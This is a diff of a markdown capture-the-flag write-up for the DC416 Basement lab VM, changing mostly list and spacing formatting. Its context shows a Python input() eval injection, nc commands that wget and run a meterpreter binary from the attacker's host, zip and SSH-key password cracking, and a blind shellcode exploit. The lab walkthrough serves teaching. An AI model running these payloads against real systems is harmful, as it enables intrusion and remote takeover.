@@ -12,15 +12,16 @@ Basement is the first of 4 VMs from the DC416 CTF by [@barrebas](https://twitter
 
 Here are my other writeups for the DC416 challenges:
 
-* [DC416 Baffle](/post/vulnhub_dc416_baffle/)
-* [DC416 Dick Dastardly](/post/vulnhub_dc416_dick_dastardly/)
-* [DC416 Fortress](/post/vulnhub_dc416_fortress/)
+- [DC416 Baffle](/post/vulnhub_dc416_baffle/)
+- [DC416 Dick Dastardly](/post/vulnhub_dc416_dick_dastardly/)
+- [DC416 Fortress](/post/vulnhub_dc416_fortress/)
 
 # information gathering
 
 Before you start with a portscan you need to wait a few minutes because there are several binaries executed by cronjobs. I noticed this during exploiting the machine so be sure to start nmapping after the machine runs a few minutes.
 
 Nmap Scan:
+
 ```
 Starting Nmap 7.31 ( https://nmap.org ) at 2016-12-17 22:15 CET
 Nmap scan report for 192.168.56.101
@@ -61,6 +62,7 @@ Nmap done: 1 IP address (1 host up) scanned in 110.74 seconds
 # jack
 
 So let's start with the service on port 10000. The script asks the user to enter a number of packets to send and executes a ping:
+
 ```
 root@kali:~/basement# nc 192.168.56.101 10000
  Please enther number of packets: 1
@@ -83,6 +85,7 @@ TypeError: int() argument must be a string or a number, not '_Helper'
 In python 2 the `ìnput` method is the same as `eval(raw_input())` so it's possible to evaluate python statements (In python 3 `input` behaves the same as `raw_input`).
 
 So by trying the payload `__import__('os').system('id')` we can see the user running this script:
+
 ```
 root@kali:~/basement# nc 192.168.56.101 10000
  Please enther number of packets: __import__('os').system('id')
@@ -92,6 +95,7 @@ PING localhost (127.0.0.1) 56(84) bytes of data
 ```
 
 So the next step is to download a meterpreter binary and execute it with the following set of commands:
+
 ```
 echo "__import__('os').system('wget -O /tmp/meterpreter http://192.168.56.3/meterpreter')" | nc 192.168.56.101 10000
 echo "__import__('os').system('chmod +x /tmp/meterpreter')" | nc 192.168.56.101 10000
@@ -99,6 +103,7 @@ echo "__import__('os').system('/tmp/meterpreter &')" | nc 192.168.56.101 10000
 ```
 
 Using the meterpreter session we are able to get the first flag:
+
 ```
 meterpreter > cat flag.txt
 flag{j4cks_t0t4L_l4cK_0f_$uRpr1sE}
@@ -107,6 +112,7 @@ flag{j4cks_t0t4L_l4cK_0f_$uRpr1sE}
 # marla #1
 
 By looking at `/etc/passwd` we can see there are 4 seperate users on the system so probably each user holds one flag.
+
 ```
 jack:x:1000:1000:jack,,,:/home/jack:/bin/bash
 marla:x:1001:1001:marla,,,:/home/marla:/bin/marla
@@ -115,6 +121,7 @@ robert:x:1003:1003:robert,,,:/home/robert:/bin/bash
 ```
 
 In the folder `/home/jack/.secret/` there is a file called `marla.xip`. A file command on the file reveals only `data` so we have to dig deeper.
+
 ```
 root@kali:~# file marla.xip
 marla.xip: data
@@ -148,6 +155,7 @@ See files filename-key.csv, filename-char_used-perc_printable.csv
 ```
 
 Now let's look at the directory with the decoded files and see if we can spot something of interest:
+
 ```
 root@kali:~/xortool/xortool_out# file * | grep -v "     data"
 000.out:                               Zip archive data
@@ -163,6 +171,7 @@ filename-key.csv:                      ASCII text
 So we have found a ZIP archive. By looking at the generated csv we can see the XOR key beeing used was `M4YH3M`.
 
 Next step is to examine the contents of the zip file.
+
 ```
 root@kali:~# mv 000.out /root/marla.zip
 root@kali:~# unzip -l marla.zip
@@ -174,9 +183,11 @@ Archive:  marla.zip
 ---------                     -------
      2162                     2 files
 ```
+
 Unfortunately the zip file is encrypted with a password so let's try to crack it.
 
 JohnTheRipper contains a handy little script called `zip2john` to extract the password hash for cracking. I then removed all except the hash from the file and ran hashcat against it.
+
 ```
 [firefart@linux hashcat]$ /home/firefart/hacking/JohnTheRipper/run/zip2john /home/firefart/marla.zip
 marla.zip:$zip2$*0*1*0*05ed2b46cc5c8fdd*4dfb*14c*3c099c875a5b4e660f310f657f34d7023b638556bc90a38168d5d752454a8954ebe2a08e064153f36afa0eb398f11139fae94e5cb7678dbda653de495847cd9e2c8c03573f6260f349a6e553b3a21647bcb351ae01ef15538cd613b97a144ad97d2f0db50bd29e093ea7772db8e465c5e6019f4427eab1f059241f86091148e8e292171a7cebb85fa07826f8b2061414931b217e63aa187ee508bad16cb1c57993bd703096b77e4e376edd9842e4363e58512b26422cbf1961a4ad741d4ab9d292a447cd6eaccd23e040702edb8be854798a35a63491b07b4c3b820e6c2a394e42a17180720cd9287f953f3482382068df0a98755ee27ba9ee0667b5b813cc3c9105a92d9f76566e9674d0c8ccc4050abeda5089d854546a5a39da8d93da503179dc6e0d847d29ede19654471d5a875e65a81e700810b4b7f1657bf8d78869e8078681dabfc35d0e0bc15fee*321fdfa476052bcf20c6*$/zip2$:::::marla.zip
@@ -212,6 +223,7 @@ Stopped: Thu Jan 19 16:34:21 2017
 Awesome so the password is `m4rl4`.
 
 We are now able to extract the zip file with `p7zip`.
+
 ```
 root@kali:~# p7zip -d marla.7z
 
@@ -244,6 +256,7 @@ Compressed: 1974
 ```
 
 So let's have a look at the extracted files:
+
 ```
 
 root@kali:~# cat marla.pub
@@ -306,6 +319,7 @@ singer           (/home/firefart/marla.key)
 Jeah so the key password is `singer`.
 
 We can now use this password to retreive the next flag:
+
 ```
 root@kali:~# ssh -i marla marla@192.168.56.101
 The authenticity of host '192.168.56.101 (192.168.56.101)' can't be established.
@@ -327,6 +341,7 @@ Connection to 192.168.56.101 closed.
 # marla #2
 
 By looking at the running processes there seems to be an audio stream of a flag streamed by `marla` and a binary only accepting connections from localhost run by `robert`.
+
 ```
 marla     3785  4.5  6.2 464280 31612 ?        S    02:10   0:06 ffserver -f /home/marla/ffserver.conf
 marla     3787 94.4  6.3 462656 32204 ?        R    02:10   2:10 ffmpeg -stream_loop -1 -f wav -i /home/marla/flag.wav http://127.0.0.1:8090/feed1.ffm
@@ -334,6 +349,7 @@ robert    3782  0.0  0.5  19644  2808 ?        S    02:10   0:00 socat TCP-LISTE
 ```
 
 First we try the streaming webserver:
+
 ```
 $ nc 127.0.0.1 8090
 GET / HTTP/1.0
@@ -350,6 +366,7 @@ wget http://127.0.0.1:8090/flag.mpg
 ```
 
 By downloading the mpg and listening to it locally, we can hear a computer generated voice saying the following numbers:
+
 ```
 102 108 97 103 123 98 82 52 105 110 95 112 97 82 97 115 49 116 101 36 125
 ```
@@ -367,6 +384,7 @@ print(b)
 # tyler
 
 When connecting to the webserver on port 8080 the following server header is returned
+
 ```
 ------[-->+++<]>.[->+++<]>.---.++++.
 ```
@@ -376,6 +394,7 @@ This string is definitely [Brainfuck](https://en.wikipedia.org/wiki/Brainfuck). 
 When trying to access files in the webroot the webserver crashes and only comes up again after some time (probably by a cron job).
 
 All error messages are also translated to Brainfuck:
+
 ```
 root@kali:~# nc 192.168.56.101 8080
 webf
@@ -389,6 +408,7 @@ Content-type: text/html
 ```
 
 By looking at the process list again the binary running seems to be `tiny`:
+
 ```
 14709  1      run_tiny.sh              0        tyler     /bin/bash /home/tyler/run_tiny.sh
 14711  14709  tiny                     0        tyler     /home/tyler/tiny 8080
@@ -538,6 +558,7 @@ I thought there must be a call to `read` writing the 10 bytes to an executable a
 By looking at the [sys_read](http://syscalls.kernelgrok.com/) syscall we can see the length to read needs to go in the `EDX` register.
 
 So our assumption about the execution flow is the following
+
 ```
 junk
 mmap
@@ -558,14 +579,14 @@ This approach was a lot try and error because there is absolutely no response bu
 
 The script does the following
 
-* generate the maximum 10 byte payload:
-	* double the value in EDX (add edx, edx)
-	* pop the return value from the stack into a register
-	* subtract a value from it
-	* jump to the new value and hope we hit a location where the read call is executed
-* sends the payload the first time. If we hit the correct value to subtract a new read should be executed
-* sends the payload over and over again, every time doubling the value in EDX
-* once we reach the desired length in `EDX` the shellcode is sent and the `CALL` instruction calls it
+- generate the maximum 10 byte payload:
+  _ double the value in EDX (add edx, edx)
+  _ pop the return value from the stack into a register
+  _ subtract a value from it
+  _ jump to the new value and hope we hit a location where the read call is executed
+- sends the payload the first time. If we hit the correct value to subtract a new read should be executed
+- sends the payload over and over again, every time doubling the value in EDX
+- once we reach the desired length in `EDX` the shellcode is sent and the `CALL` instruction calls it
 
 To find the value to subtract from EDX we simply loop over 0 till 255 and try every value. This will jump in one byte steps relative to the `CALL` instruction till we hit the `READ` call again.
 
@@ -699,6 +720,7 @@ p.interactive()
 ```
 
 Last output from the run:
+
 ```
 [+] Opening connection to 127.0.0.1 on port 10001: Done
 [*] Payload: \x01\xd2\x5f\x48\x83\xef\x25\xff\xe7\x90
@@ -721,6 +743,7 @@ Now we can also get the `tenbytes` binary and look at it to confirm our script
 Thanks [@barrebas](https://twitter.com/barrebas) for a lot hours trying to blindly bruteforce the binary :)
 
 The flags:
+
 ```
 flag{j4cks_t0t4L_l4cK_0f_$uRpr1sE}
 flag{bR4in_paRas1te$}
